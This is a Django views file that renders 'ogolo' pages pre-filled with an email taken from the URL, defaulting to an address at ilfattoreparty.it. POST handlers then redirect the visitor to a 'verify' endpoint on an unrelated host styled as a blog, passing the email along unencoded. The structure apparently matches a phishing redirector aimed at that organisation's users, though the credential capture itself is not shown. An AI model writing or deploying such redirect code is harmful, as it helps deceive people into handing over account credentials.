import json
from django.shortcuts import render
from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt

def home(request):
    return render(request, 'frontend/index.html')


def ogolo_redirect(request):
    # raw_query = request.META.get('QUERY_STRING', '')
    # email = raw_query if '@' in raw_query else 'info@ilfattoreparty.it'
    email = request.GET.get('email', 'info@ilfattoreparty.it')

    print(email)

    context = {
        'email': email,
    }
    return render(request, 'frontend/ogolo.html', context)

# @csrf_exempt
def process_ogolo(request):
    if request.method == "POST":
        try:
            data = json.loads(request.body)
            email = data.get('email', 'info@ilfattoreparty.it')
            print(email)
        except:
            email = 'info@ilfattoreparty.it'
        
        redirect_url = (
            f"https://karenblogpost.onrender.com/app/verify/?em={email}"
        )
        # redirect_url = ("http://localhost:8000/")
        # http://localhost:8000/account/sign-in/?jeremy@gmail.com
        
        return JsonResponse({'redirect_url': redirect_url})
    else:
        return JsonResponse({'error': 'Invalid method'}, status=405)
    

def ogolo_man_redirect(request):
    # raw_query = request.META.get('QUERY_STRING', '')
    # email = raw_query if '@' in raw_query else 'info@ilfattoreparty.it'
    email = request.GET.get('email', 'info@ilfattoreparty.it')

    context = {
        'email': email,
    }
    return render(request, 'frontend/ogolo_man.html', context)

# @csrf_exempt
def process_man_ogolo(request):
    if request.method == "POST":
        try:
            data = json.loads(request.body)
            email = data.get('email', 'info@ilfattoreparty.it')
        except:
            email = 'info@ilfattoreparty.it'
        
        redirect_url = (
            f"https://karenblogpost.onrender.com/app/verify/?em={email}"
        )
        # redirect_url = ("http://localhost:8000/")
        # http://localhost:8000/user/sign-in/?jeremy@gmail.com
        
        return JsonResponse({'redirect_url': redirect_url})
    else:
        return JsonResponse({'error': 'Invalid method'}, status=405)
